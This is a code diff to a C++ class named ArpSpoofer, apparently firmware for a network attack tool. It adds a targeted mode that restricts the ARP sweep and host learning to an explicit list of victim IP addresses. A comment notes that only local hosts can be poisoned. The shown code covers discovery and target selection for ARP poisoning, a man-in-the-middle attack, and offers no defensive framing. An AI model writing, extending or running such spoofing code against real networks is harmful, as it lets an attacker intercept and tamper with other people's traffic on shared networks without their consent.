@@ -42,6 +42,8 @@ bool ArpSpoofer::begin() {
   _netBase   = netH + 1;                    // skip the network address
   _hostCount = size - 1;                    // skip the broadcast address
   if (_hostCount > (uint32_t)MAX_TARGETS) _hostCount = MAX_TARGETS;
+  // Targeted mode: the sweep walks the explicit list instead of the subnet.
+  if (_explicitCount) _hostCount = _explicitCount;
 
   _sweepIdx  = 0;
   _sweepDone = false;
@@ -190,8 +192,8 @@ void ArpSpoofer::sweepStep() {
   if (!_running || _sweepDone) return;
 
   for (int i = 0; i < SWEEP_BATCH && _sweepIdx < _hostCount; i++, _sweepIdx++) {
-    const uint32_t ipH = _netBase + _sweepIdx;
-    const uint32_t ipN = htonl(ipH);
+    const uint32_t ipN = _explicitCount ? _explicit[_sweepIdx]
+                                        : htonl(_netBase + _sweepIdx);
     if (ipN == _selfIp) continue;      // no point asking about ourselves
 
     // "Who has <ip>? Tell <us>" — replies come back unicast and are picked up
@@ -200,6 +202,11 @@ void ArpSpoofer::sweepStep() {
   }
 
   if (_sweepIdx >= _hostCount) _sweepDone = true;
+}
+
+void ArpSpoofer::setTargets(const uint32_t* ipsNetworkOrder, uint8_t count) {
+  _explicitCount = count > MAX_EXPLICIT ? MAX_EXPLICIT : count;
+  for (uint8_t i = 0; i < _explicitCount; ++i) _explicit[i] = ipsNetworkOrder[i];
 }
 
 void ArpSpoofer::observe(const uint8_t* eth, uint16_t len) {
@@ -291,6 +298,12 @@ void ArpSpoofer::observeIpv4(const uint8_t* srcMac, uint32_t srcIp) {
   if (_gwKnown && memcmp(srcMac, _gwMac, 6) == 0) return;
   // Only local hosts can be poisoned.
   if ((ntohl(srcIp) & _maskH) != _netH) return;
+  // Targeted mode: never learn hosts outside the explicit list.
+  if (_explicitCount) {
+    bool listed = false;
+    for (uint8_t i = 0; i < _explicitCount; ++i) if (_explicit[i] == srcIp) { listed = true; break; }
+    if (!listed) return;
+  }
 
   _add(srcIp, srcMac);
 }
